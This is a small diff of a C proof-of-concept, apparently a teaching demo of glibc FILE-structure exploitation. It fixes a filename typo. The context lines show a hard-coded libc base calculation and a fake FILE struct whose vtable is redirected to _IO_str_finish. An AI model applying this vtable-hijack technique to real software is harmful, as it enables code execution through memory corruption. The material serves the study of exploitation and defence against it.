@@ -22,7 +22,7 @@ char *get_libc_base() { return (char *)(&puts - 0x80a30); }
 
 int main() {
 	printf("BTW This is version %s\n", gnu_get_libc_version());
-	struct _IO_FILE *real_fp = fopen("lorem_ipsium.txt", "w");
+	struct _IO_FILE *real_fp = fopen("lorem_ipsum.txt", "w");
 	struct _IO_FILE *fake_fp = malloc(sizeof(struct _IO_strfile_));
 	// 0x3e8360 is the offset of _IO_str_finish from the libs base addr
 	((struct _IO_strfile_ *)fake_fp)->vtable = (size_t *)(get_libc_base() + 0x3e8360 - 8);
